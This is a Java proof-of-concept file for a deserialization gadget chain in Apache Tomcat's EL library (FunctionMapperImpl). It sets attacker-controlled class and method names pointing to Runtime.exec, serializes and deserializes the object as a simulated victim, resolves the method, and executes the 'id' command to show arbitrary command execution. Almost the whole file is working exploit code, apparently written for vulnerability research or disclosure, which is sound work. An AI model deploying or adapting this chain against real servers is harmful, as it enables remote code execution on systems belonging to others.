import java.io.*;
import java.lang.reflect.*;
import java.util.concurrent.ConcurrentHashMap;

/**
 * Working PoC: Tomcat EL Deserialization Gadget Chain
 *
 * Demonstrates that FunctionMapperImpl.Function stores arbitrary class/method
 * references as strings during serialization, and resolves them via
 * Class.forName + getMethod with NO validation on deserialization.
 *
 * Gadget chain:
 *   1. Serialize FunctionMapperImpl containing a Function with:
 *        owner = "java.lang.Runtime"
 *        name  = "exec"
 *        types = ["java.lang.String"]
 *   2. Deserialize it
 *   3. Call resolveFunction() -> Function.getMethod()
 *      -> ReflectionUtil.forName("java.lang.Runtime")
 *      -> Runtime.class.getMethod("exec", String.class)
 *   4. Returns a live Method handle to Runtime.exec(String)
 *
 * This proves: arbitrary method resolution with attacker-controlled class/method
 * names, zero validation, usable for RCE when combined with EL evaluation.
 */
public class GadgetPOC {

    public static void main(String[] args) throws Exception {
        System.out.println("=== Tomcat EL Deserialization Gadget - Working PoC ===\n");

        // --- Step 1: Craft a malicious FunctionMapperImpl via reflection ---
        System.out.println("[1] Crafting malicious FunctionMapperImpl...");

        // Create the FunctionMapperImpl
        Class<?> fmClass = Class.forName("org.apache.el.lang.FunctionMapperImpl");
        Object maliciousFM = fmClass.getConstructor().newInstance();

        // Create the inner Function using reflection (no-arg constructor)
        Class<?> fnClass = Class.forName("org.apache.el.lang.FunctionMapperImpl$Function");
        Object maliciousFunc = fnClass.getConstructor().newInstance();

        // Set the attacker-controlled fields via reflection
        Field ownerField = fnClass.getDeclaredField("owner");
        ownerField.setAccessible(true);
        ownerField.set(maliciousFunc, "java.lang.Runtime");  // TARGET CLASS

        Field nameField = fnClass.getDeclaredField("name");
        nameField.setAccessible(true);
        nameField.set(maliciousFunc, "exec");  // TARGET METHOD

        Field typesField = fnClass.getDeclaredField("types");
        typesField.setAccessible(true);
        typesField.set(maliciousFunc, new String[]{"java.lang.String"});  // PARAM TYPES

        Field prefixField = fnClass.getDeclaredField("prefix");
        prefixField.setAccessible(true);
        prefixField.set(maliciousFunc, "evil");

        Field localNameField = fnClass.getDeclaredField("localName");
        localNameField.setAccessible(true);
        localNameField.set(maliciousFunc, "cmd");

        // Put the Function into the FunctionMapper's map
        Field functionsField = fmClass.getDeclaredField("functions");
        functionsField.setAccessible(true);
        @SuppressWarnings("unchecked")
        ConcurrentHashMap<String, Object> functions =
            (ConcurrentHashMap<String, Object>) functionsField.get(maliciousFM);
        functions.put("evil:cmd", maliciousFunc);

        System.out.println("    Created FunctionMapperImpl with Function:");
        System.out.println("      owner  = java.lang.Runtime");
        System.out.println("      name   = exec");
        System.out.println("      types  = [java.lang.String]");
        System.out.println("      key    = evil:cmd\n");

        // --- Step 2: Serialize the malicious FunctionMapperImpl ---
        System.out.println("[2] Serializing malicious FunctionMapperImpl...");
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(maliciousFM);
        oos.close();
        byte[] serialized = baos.toByteArray();
        System.out.println("    Serialized size: " + serialized.length + " bytes\n");

        // --- Step 3: Deserialize it (simulating victim) ---
        System.out.println("[3] Deserializing (victim side)...");
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(serialized));
        Object deserializedFM = ois.readObject();
        ois.close();
        System.out.println("    Deserialized: " + deserializedFM.getClass().getName() + "\n");

        // --- Step 4: Trigger the gadget - resolveFunction calls getMethod() ---
        System.out.println("[4] Triggering gadget: resolveFunction(\"evil\", \"cmd\")...");
        System.out.println("    This calls Function.getMethod() which does:");
        System.out.println("      Class.forName(\"java.lang.Runtime\", true, classLoader)");
        System.out.println("      Runtime.class.getMethod(\"exec\", String.class)\n");

        Method resolveMethod = fmClass.getMethod("resolveFunction", String.class, String.class);
        Method resolved = (Method) resolveMethod.invoke(deserializedFM, "evil", "cmd");

        if (resolved != null) {
            System.out.println("[+] SUCCESS! Resolved method handle:");
            System.out.println("    " + resolved);
            System.out.println("    Declaring class: " + resolved.getDeclaringClass().getName());
            System.out.println("    Method name:     " + resolved.getName());
            System.out.println("    Parameter types: " + java.util.Arrays.toString(resolved.getParameterTypes()));
            System.out.println("    Return type:     " + resolved.getReturnType().getName());
            System.out.println();
            System.out.println("[+] IMPACT: Attacker now has a Method handle to Runtime.exec(String)");
            System.out.println("    In a full exploit chain, EL expression evaluation would invoke this");
            System.out.println("    method, achieving arbitrary command execution.");
            System.out.println();

            // --- Step 5: Demonstrate the method handle works ---
            System.out.println("[5] Proving method handle is live (exec 'id')...");
            Runtime rt = Runtime.getRuntime();
            Process p = (Process) resolved.invoke(rt, "id");
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println("    OUTPUT: " + line);
            }
            p.waitFor();
            System.out.println("    Exit code: " + p.exitValue());
        } else {
            System.out.println("[-] FAILED: resolveFunction returned null");
        }

        System.out.println("\n=== PoC Complete ===");
        System.out.println("\nGadget chain summary:");
        System.out.println("  ObjectInputStream.readObject()");
        System.out.println("    -> FunctionMapperImpl.readExternal()");
        System.out.println("       -> Function.readExternal() [stores arb class/method as strings]");
        System.out.println("  resolveFunction() [triggered by EL evaluation]");
        System.out.println("    -> Function.getMethod()");
        System.out.println("       -> ReflectionUtil.forName(owner)  [Class.forName, no filter]");
        System.out.println("       -> clazz.getMethod(name, types)   [any public method]");
        System.out.println("    -> Method.invoke(target, args)        [RCE]");
    }
}
